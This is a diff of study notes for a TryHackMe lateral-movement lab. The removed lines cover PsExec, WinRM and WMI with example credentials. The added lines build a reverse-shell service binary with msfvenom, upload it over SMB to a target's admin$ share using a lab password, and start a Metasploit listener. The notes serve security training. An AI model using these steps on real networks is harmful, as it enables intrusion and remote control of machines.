@@ -2,7 +2,7 @@ Connecting to the network
 -AttackBOx
 -test
 systemd-resolve --interface lateralmovement --set-dns [IP] --set-domain za.tryhackme.com
-nclookup thmdc.za.tryhackme.com
+nslookup thmdc.za.tryhackme.com
 -http://distributor.za.tryhackme.com/creds
 -get credentials
 ssh za\\<AD Username>@thmjmp2.za.tryhackme.com
@@ -18,34 +18,10 @@ Lateral Movement
 --------------------------------------------------------------------------------------------------------------------------------------------------------
 
 Spawning Processes Remotely
+-leverage windows services to run arbitrary commands
 
-1. Psexec - execute processes remotely
--sysinternals tools
-a. connecto to Admin@ share and upload a service binary -> psexesvc.exe
-b. connect to service control manager to create and run a service named psexesvc and associate the service binary with C:\Windows\psexesvc.exe
-c. create some named pipes to handle stdin/stdout/stderr
--under c:\tools
-psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
-
-2. Remote Process Creation Using WinRM
--ports: 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
--required Group memberships: Remote Management Users
-WinRM:
--windows remote management: web based protocol used to send powershell commands to windows hosts remotely
--enabled by default
-winrs.exe -u:Administrator -p:Mypass123 -r:target cmd
--pass different credentials using powershell
-$username = 'Administrator';
-$password = 'Mypass123';
-$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
-$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
--create interactive session
-Enter-PSSession -Computername TARGET -Credential $credential
-
-3. Windows Management Instrumentation
-WMI - implementation of web-based enterprise management
--allows admins to perform standard managemnt tasks that attckers can abuse to perform lateral movement
-
-connecting to wmi from powershell
--create PSCredential object with our user and password - stored in $credential variable 
+Steps: 
+msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=IP LPORT=PORT -o myservice.exe
+smbclient -c 'put myservice.exe' -U t1_leonard.summers -W ZA '//IP/admin$/' EZpass4ever
+msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST lateralmovement; set LPORT PORT;exploit"
 
